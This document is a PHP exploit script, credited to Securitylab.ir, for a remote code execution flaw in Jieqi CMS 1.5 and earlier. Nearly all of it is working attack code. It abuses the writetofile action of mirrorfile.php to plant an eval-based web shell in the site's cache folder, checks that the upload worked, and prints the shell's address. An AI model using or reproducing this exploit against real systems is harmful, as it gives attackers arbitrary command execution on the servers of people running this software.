&lt;?php
print_r(&#039;
+---------------------------------------------------------------------------+
Jieqi cms &lt;= 1.5 remote code execution exploit
by Securitylab.ir
mail: secu_lab_ir@yahoo.com
+---------------------------------------------------------------------------+
&#039;);
/**
* works regardless of php.ini settings
*/
if ($argc &lt; 3) {
... print_r(&#039;
+---------------------------------------------------------------------------+
Usage: php &#039;.$argv[0].&#039; host path
host:..... target server (ip/hostname)
path:..... path to jieqi cms
Example:
php &#039;.$argv[0].&#039; localhost /
+---------------------------------------------------------------------------+
&#039;);
... exit;
}
error_reporting(7);
ini_set(&#039;max_execution_time&#039;, 0);
$host = $argv[1];
$path = $argv[2];
$url = 
&#039;http://&#039;.$host.$path.&#039;mirrorfile.php?filename=cache/seculab.php&amp;action=writetofile&amp;content=&#039;;
$shell = &#039;http://&#039;.$host.$path.&#039;cache/seculab.php&#039;;
$cmd = urlencode(&quot;&lt;?php @eval(\$_POST[hamed]);?&gt;test&quot;);
$str = file_get_contents($url.$cmd);
if ( file_get_contents($shell) == &#039;test&#039;)
exit(&quot;Expoilt Success!\nView Your shell:\t$shell\n&quot;);
else
exit(&quot;Exploit Failed!\n&quot;);
?&gt;

